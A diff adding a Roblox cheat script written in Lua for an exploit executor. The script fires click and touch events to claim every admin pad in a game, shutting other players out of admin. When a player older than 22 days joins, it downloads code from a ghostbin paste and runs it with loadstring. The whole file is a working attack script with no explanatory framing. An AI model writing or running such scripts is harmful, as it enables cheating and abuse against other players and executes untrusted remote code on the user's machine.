@@ -1,0 +1,30 @@
+local plrs = game:GetService'Players'
+local lp = game.Players.LocalPlayer
+local Admin = game:GetService("Workspace").Terrain["_Game"].Admin
+local Pads = Admin.Pads
+local regen = Admin:FindFirstChild("Regen")
+
+
+fireclickdetector(regen.ClickDetector, 0)
+wait(.12)
+for i, v in pairs(Pads:GetChildren()) do
+    spawn(
+    function()
+        firetouchinterest(lp.Character:WaitForChild("Head"), v.Head, 0)
+        firetouchinterest(lp.Character:WaitForChild("Head"), v.Head, 1)
+    end
+    )
+    wait(.00000001)
+end
+
+wait(.9)
+plrs:Chat("aaaaaaaaaa.")
+plrs.PlayerAdded:Connect(function(plyr)
+if plyr.AccountAge > 22 then
+    repeat wait()
+        until plyr.Character
+    loadstring(game:HttpGet(('https://ghostbin.com/KDcAS/raw'),true))()
+    wait(.75)
+    plrs:Chat("probably not.")
+    end
+    end)
